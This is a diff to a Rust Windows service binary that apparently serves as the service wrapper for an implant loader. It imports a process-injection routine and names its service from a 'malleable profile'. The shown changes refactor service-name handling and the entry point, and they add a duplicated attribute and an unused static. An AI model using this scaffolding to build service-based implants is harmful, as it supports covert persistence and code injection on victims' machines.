@@ -1,5 +1,7 @@
 #![no_std]
 #![no_main]
+#![cfg_attr(not(test), windows_subsystem = "windows")]
+#![no_main]
 
 use crate::injector::inject_current_process;
 use windows_sys::{
@@ -22,24 +24,24 @@ fn panic(_info: &core::panic::PanicInfo) -> ! {
     loop {}
 }
 
-/// Creates a service binary name, based on the malleable profile (or unwrap at comptime). The macro
+/// Creates a service binary name, based on the malleable profile (or unwrap at comptime). The fn
 /// returns a PWSTR (*mut u16) which can be used in place of a PWSTR in windows_sys
-macro_rules! service_name_pwstr {
-    () => {{
-        let svc_name = option_env!("SVC_NAME").unwrap();
-        const MAX_SVC_NAME_LEN: usize = 256;
-        let mut buf = [0u16; MAX_SVC_NAME_LEN];
-        let mut pos: usize = 0;
-        for (i, c) in svc_name.encode_utf16().enumerate() {
-            buf[i] = c;
+fn get_service_name_wide() -> [u16; 256] {
+    let mut buf = [0u16; 256];
+    static mut INITIALIZED: bool = false;
+
+    let svc_name = option_env!("SVC_NAME").unwrap_or("DefaultService");
+    let mut pos = 0;
+
+    for c in svc_name.encode_utf16() {
+        if pos < 255 {
+            buf[pos] = c;
             pos += 1;
         }
+    }
+    buf[pos] = 0;
 
-        // append null byte
-        buf[pos] = 0u16;
-
-        PWSTR::from(buf.as_mut_ptr())
-    }};
+    buf
 }
 
 #[unsafe(no_mangle)]
@@ -48,9 +50,11 @@ pub unsafe extern "system" fn ServiceMain(_: u32, _: *mut PWSTR) {
 }
 
 fn svc_start() {
+    let mut svc_name = get_service_name_wide();
     // register the service with SCM
-    let h_svc =
-        unsafe { RegisterServiceCtrlHandlerW(service_name_pwstr!(), Some(service_handler)) };
+    let h_svc = unsafe {
+        RegisterServiceCtrlHandlerW(PWSTR::from(svc_name.as_mut_ptr()), Some(service_handler))
+    };
     if h_svc.is_null() {
         return;
     }
@@ -67,10 +71,13 @@ unsafe extern "system" fn service_handler(control: u32) {
     }
 }
 
-fn main() {
+#[unsafe(no_mangle)]
+pub extern "C" fn main() -> i32 {
+    let mut svc_name = get_service_name_wide();
+
     let service_table = [
         SERVICE_TABLE_ENTRYW {
-            lpServiceName: service_name_pwstr!(),
+            lpServiceName: PWSTR::from(svc_name.as_mut_ptr()),
             lpServiceProc: Some(ServiceMain),
         },
         SERVICE_TABLE_ENTRYW::default(),
@@ -78,9 +85,11 @@ fn main() {
 
     unsafe {
         if StartServiceCtrlDispatcherW(service_table.as_ptr()) == FALSE {
-            return;
+            return 1;
         }
     }
+
+    0
 }
 
 pub unsafe fn update_service_status(h_status: SERVICE_STATUS_HANDLE, state: u32) {
